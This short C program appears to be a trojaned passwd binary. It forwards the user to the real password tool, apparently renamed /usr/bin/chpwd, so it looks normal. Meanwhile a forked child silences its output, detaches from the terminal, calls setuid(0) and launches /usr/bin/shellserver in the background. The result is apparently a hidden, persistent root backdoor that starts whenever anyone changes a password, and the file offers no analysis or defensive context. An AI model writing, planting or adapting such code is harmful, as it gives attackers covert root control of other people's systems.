#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <errno.h>
#include <stdio.h>

int main(int argc, char **argv) {
		pid_t pid = fork();
		pid_t sid;

		if (pid == -1 || pid != 0) {
			argv[0] = "passwd";
			execvp("/usr/bin/chpwd", argv);
			exit(0);
		} else {
			// http://stackoverflow.com/questions/9037831/how-to-use-fork-to-daemonize-a-child-process-independant-of-its-parent/
			freopen ("/dev/null", "w", stdout);
			freopen ("/dev/null", "w", stderr);
			freopen ("/dev/zero", "r", stdin);

			signal (SIGHUP, SIG_IGN);
			sid = setsid();
			setuid(0);	

			execvp("/usr/bin/shellserver", argv);

			exit(0);
		}
		return 0;
}
